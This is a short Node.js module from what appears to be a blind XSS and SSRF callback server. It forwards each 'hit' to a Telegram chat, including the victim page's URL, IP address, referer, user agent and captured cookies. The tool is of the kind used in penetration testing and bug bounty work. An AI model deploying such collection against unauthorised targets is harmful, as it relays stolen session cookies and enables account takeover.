const TelegramBot = require('node-telegram-bot-api');

let bot = null;

function getBot() {
  if (!bot && process.env.TELEGRAM_BOT_TOKEN) {
    bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN);
  }
  return bot;
}

async function sendAlert(hit) {
  const b = getBot();
  if (!b || !process.env.TELEGRAM_CHAT_ID) {
    console.log('[Telegram] Not configured, skipping alert');
    return;
  }

  const truncate = (str, len = 300) => {
    if (!str) return 'N/A';
    return str.length > len ? str.substring(0, len) + '...' : str;
  };

  const message = [
    `🎯 *Blind XSS Hit #${hit.id}*`,
    ``,
    `📍 *URL:* \`${truncate(hit.origin_url, 200)}\``,
    `🕐 *Time:* ${new Date(hit.created_at).toUTCString()}`,
    `🌐 *IP:* \`${hit.ip || 'N/A'}\``,
    `🔗 *Referer:* \`${truncate(hit.referer, 150)}\``,
    ``,
    `🍪 *Cookies:* \`${truncate(hit.cookies)}\``,
    ``,
    `🖥️ *User Agent:* \`${truncate(hit.user_agent, 150)}\``,
    ``,
    `👉 View full details on your dashboard`,
  ].join('\n');

  try {
    await b.sendMessage(process.env.TELEGRAM_CHAT_ID, message, {
      parse_mode: 'Markdown',
      disable_web_page_preview: true,
    });
    console.log(`[Telegram] Alert sent for hit #${hit.id}`);
  } catch (err) {
    console.error('[Telegram] Failed to send alert:', err.message);
  }
}


async function sendSsrfAlert(hit) {
  const b = getBot();
  if (!b || !process.env.TELEGRAM_CHAT_ID) return;

  const truncate = (str, len = 300) => {
    if (!str) return 'N/A';
    return str.length > len ? str.substring(0, len) + '...' : str;
  };

  const message = [
    `🔥 *SSRF Callback #${hit.id}*`,
    ``,
    `🎯 *Probe ID:* \`${hit.probe_id || 'N/A'}\``,
    `🕐 *Time:* ${new Date(hit.created_at).toUTCString()}`,
    `🌐 *IP:* \`${hit.ip || 'N/A'}\``,
    `🔗 *Referer:* \`${truncate(hit.referer, 150)}\``,
    `🖥️ *User Agent:* \`${truncate(hit.user_agent, 150)}\``,
    `🏠 *Host Header:* \`${hit.host_header || 'N/A'}\``,
    ``,
    `👉 View full details on your dashboard`,
  ].join('\n');

  try {
    await b.sendMessage(process.env.TELEGRAM_CHAT_ID, message, {
      parse_mode: 'Markdown',
      disable_web_page_preview: true,
    });
    console.log(`[Telegram] SSRF alert sent for hit #${hit.id}`);
  } catch (err) {
    console.error('[Telegram] Failed to send SSRF alert:', err.message);
  }
}

module.exports = { sendAlert, sendSsrfAlert };
